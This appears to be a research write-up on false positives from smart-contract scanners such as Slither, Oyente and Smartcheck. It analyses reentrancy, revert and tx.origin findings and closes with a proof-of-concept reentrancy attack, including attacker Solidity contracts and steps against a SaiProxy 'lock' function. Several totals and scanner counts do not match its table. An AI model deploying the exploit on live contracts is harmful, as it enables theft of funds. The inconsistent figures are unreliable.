#################################################
Evaluations and Analysis on 76354 Smart Contracts
#################################################

Extracting DMs From Detection Behaviors
---------------------------------------

**Table 1: The number of detected vulnerabilities at contract level and true positive (TP) rate of each scanner.**

+--------------------------+--------------+--------------+--------------+----------+
| Vulnerability (TP Rate)  | Slither      | Oyente       | Smartcheck   | Securify |
| -------------------------+--------------+--------------+--------------+----------+
| Reentrancy               | 498 (9.24%)  | 108 (50.93%) | x            |          |
+--------------------------+--------------+--------------+--------------+----------+
| Abuse of tx.origin       | 34 (100.0%)  | x            | 210 (29.05%) | x        |
+--------------------------+--------------+--------------+--------------+----------+
| Unchecked low level call | x            | x            | 551 (65.70%) | x        |
+--------------------------+--------------+--------------+--------------+----------+
| Unexpected revert        | 666 (35.29%) | x            | 274 (93.79%) | x        |
+--------------------------+--------------+--------------+--------------+----------+
| Self destruct            | 46 (23.91%)  | x            | x            | x        |
+--------------------------+--------------+--------------+--------------+----------+

As shown in Table 1, we apply the three scanners on the six types of vulnerabilities. Overall, among these three scanners, **Slither** seems to achieve the best results, reporting most vulnerabilities---totally 2631 vulnerability candidates of five types. In contrast, **Smartcheck** reports 1072 candidates and **Oyente** reports only 588 candidates.  However, due to the  internal detection mechanisms, each scanner inevitably yields some FPs.

After manual inspection of human expertise, the TP rate is shown at the second row of each cell in Table 1. In generally, **Slither** reports the most candidates, but suffers from a big issue of a high FP rate. Especially for reentrancy, the TP rate of **Slither** is only about 9%. As dynamic analysis is more accurate, **Oyente**'s TP is still acceptable. To some extent, it is unexpected that the TP rate of **Smartcheck** is good. We review some FPs of these scanners as below.

As the reentrancy caused some significant losses in the past `daoAttack <https://doi.org/10.1109/ICSAI.2017.8248566>`_, the real contracts on Ethereum have already adopted some DMs to prevent from the actual invocation of reentrancy.  We summarize the five main categories of DMs: 

-  Hard-coding the constant value for the address of payee or payer
-  Using `private` modifier for the function declaration
-  Adding the self-predefined modifier in the function declaration 
-  Using `if` lock(s) to prevent reentrancy. However, these DMs are seldom discussed in relevant studies or considered in existing scanners. Hence, the ignorance about possible DMs will result in the high FP rate of detection


.. image:: interval.png
    :width: 300px
    :alt: interval_line
    :align: center

For the first DM, in CB1_, according to rule of **Slither**:


.. image:: slither_rule.png
    :width: 200px
    :alt: slither_rule
    :align: center


CB1_ is reported as a reentrancy  by **Slither**---firstly, it writes to the public variable *total_reward*; then calls external function *buyTokens.value*; last, writes to the public variable *winnerPoolTotal*. However, in reality, reentrancy will never be triggered by external attackers due to the hard-coded address value at line 13 in CB1_. Similarly, in CB2_, we show a FP for **Oyente**, according to its run-time detection rule below:


.. image:: oyente_rule.png
    :width: 200px
    :alt: oyente_rule
    :align: center


where r(varg) means read operation(s) to a public variable, gas(trans) > 2300 means the gas for transaction must be larger than 2300, amt(bal) > amt(trans) means the balance amount must be larger than transfer amount, and lastly the global variable could be changed before external calls.


Although CB2_ satisfies all the four conditions, it actually could not be triggered by external attackers, again due to the only hard-coded address allowed in the transaction.


.. image:: interval.png
    :width: 300px
    :alt: interval_line
    :align: center


For the second DM of using private modifier, the existing scanners fail to consider that. In our manual inspection  of FPs, we consider the following defense is successful: if this private function (reported by **Slither** or **Oyente** as reentrancy) is never called by other public  functions in the same contract, or only called by the public functions that have no loop path in  their CFGs. Under such scenario, the reported function will actually never be recursively called by external attackers. For example, if we changed the modifier of  function *buyOne* from *public* to *private* at line 1 in CBoriginal_, **Slither** would still report it as a reentrancy vulnerability---but it could never be called by external attackers, as it is not called in other functions. We find that **Oyente** also suffers from this FP issue.


.. image:: interval.png
    :width: 300px
    :alt: interval_line
    :align: center


For the third DM of adopting user-defined modifier for protection, we find some interesting cases that are falsely reported by existing scanners. For example, CB3_ actually takes into account the security issue and adds the self-defined modifier *onlyAdmin* before the possibly vulnerable function *regstDocs*. Since *onlyAdmin* restricts that the transaction can be only done by the *admin* or *owner* role, otherwise the transactions will be reverted. In such a way, *regstDocs* could not be recursively called by external attackers.


.. image:: interval.png
    :width: 300px
    :alt: interval_line
    :align: center


Different from the above three DMs on permission control to prevent external malicious calls, the last DM is to prevent the recursive entrance for the function---eliminating the issue from root. For instance, in CB4_, the internal instance variable *reEntered* will be checked at line 5 before processing the business logic between line 8 and 10. To prevent the reentering due to calling *ZTHTKN.buyAndSetDivPercentage.value*, *reEntered* will switched to *true*; after the transaction is done, it will be reverted to *false* to allow other transactions.


.. image:: interval.png
    :width: 300px
    :alt: interval_line
    :align: center


Totally, 457 FP cases are manually identified for **Slither**. Among them, 216 FPs are attributed for the first DM,  76 FPs for the second,  47 FPs for the third, and only 1 FP for the forth DM and 117 for other causes. In contrast, **Oyente** has fewer FP cases (only 53 in total), among which the distribution for the four caused DMs is 5, 5, 22 and 0. 


FPs of Unexpected Revert
------------------------


Though **Slither** and **Smartcheck** can detect some cases, their rules currently are so general that most reported cases are actually bad coding practices (e.g., warnings hinted by the IDE) rather than exploitable vulnerabilities. Specifically, **Slither** reports 666 cases of calls in loop, as long as an external call (e.g., *send* or *transfer* of other addresses) is inside a loop, regardless of its actual impact. For instance, CB5_ reported by **Slither** will not cause expected revert, as *require* is not used to check the return value of function *send*. Similarly, **Smartcheck** also supports the detection of transfer in loop. As **Smartcheck** checks only *transfer* in a loop, it reports a much smaller number (274) than that of **Slither** (666). However, after manual auditing, we find that they report many common TPs, with 235 TPs for **Slither** and 257 TPs for **Smartcheck**. Most FPs of **Slither** are due to inconsideration of the key *require* check that causes reverting.


According to our observation, the rules of call/transaction in loop are neither sound nor complete to cover most of unexpected revert cases. At least, modifier *require*  is ignored in these two rules, which makes **Slither** and **Smartcheck** incapable to check possible revert operations on multiple account addresses. Here,  multiple accounts must be involved for exploiting this attack---the failure on one account blocks other accounts via reverting the operations for the whole loop. Hence, CB6_ reported by **Smartcheck** is FP, as the operations in the loop are all on the same account (i.e., *sender* at line 8) and potential revert will not affect other accounts.


FPs of Tx.origin Abusing
------------------------


For this vulnerability, **Slither** reports 34 results, none of which are FPs. **Slither**'s rule is simple but effective:


.. image:: slither_rule_tx.png
    :width: 300px
    :alt: slither_rule_tx
    :align: center


It finds all *Tx.origin* that appears in control flow condition. The rationale is that accessing *Tx.Origin* is just a bad programming practice by itself, not vulnerable. Only when used in control flow conditions, it could be manipulated for control flow hijack.

In contrast, **Smartcheck** reports much more cases (210) than **Slither** (34), as it is more complete in considering both control flow conditions inside a function  and the modifier code outside the function: 


.. image:: smartcheck_rule_tx.png
    :width: 300px
    :alt: smartcheck_rule_tx
    :align: center

Attack code:
::

    contract TubInterface {
        constructor() payable {}
        SaiProxy s;
        address victim;
        bytes32 temp;
        address gemp;
        function setVictim(address _addr, address _gem) {
            s = SaiProxy(_addr);
            victim = _addr;
            gemp = _gem;
        }
        ...
        function cups(bytes32 cup) public returns (address, uint, uint, uint){
            return (victim, 0, 0, 0);
        }
        function gem() public view returns (TokenInterface){
            return(TokenInterface(gemp));
        }
        ...
    }

    contract TokenInterface {
        bytes32 temp;
        address tubbb;
        SaiProxy s;
        TubInterface tub = new TubInterface();
        function setVictim(address _addr, address _tub) {
            s = SaiProxy(_addr);
            tubbb = _tub;
        }
        constructor() payable {}
        ...
        function deposit() public payable{
            s.lock.value(1 ether)(tubbb, temp);
                //s.open(this);
        }
        ...
    }

Attacked code:
::

    contract SaiProxy is DSMath {
        ...
        function lock(address tub_, bytes32 cup) public payable {
            if (msg.value > 0) {
                TubInterface tub = TubInterface(tub_);

                (address lad,,,) = tub.cups(cup);
                require(lad == address(this), "cup-not-owned");

                tub.gem().deposit.value(msg.value)();
                ...
            }
        }
    }

In this case, the goal of our reentrancy is ``tub.gem().deposit.value(msg.value)();`` in the victim code. To reach our goal we need pass three conditions. Firstly we need to make sure the *msg.value* is greater than 0. Next we need to declare a new ``TuberInterface`` instance and call its ``cups`` function to return a address to the variable ``lad``. Last, we need to make sure the address stored in `lad` equals to the address of the victim contract.

**Preparation.** We call ``setVictim`` function in attack code to set the address of victim code to the variable ``_addr`` and set the address of the other attack contract ``TokenInterface`` to ``_gem``. Next we call the other ``setVictim`` function in contract ``TokenInterface`` then set the address of victim code to ``_addr`` and set ``tubbb`` an address the same as ``_addr``. 

**Attack.** The attacker call `deposit` function, it calls ``lock`` function in victim contract.  The ``if`` condition is satisfied because we our call is appended by ``.value``. Next, the contract initialize  an instance of the contract ``TubInterface`` and call ``cup`` to get the address. Unfortunately, the function involved in this attack is well manipulated and we won't let it fail. Then the contract checks whether the ``lad`` equals to the address of the victim contract. It doesn't work. We finally get to the key statement ``tub.gem().deposit`` which calls back to the `gem` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.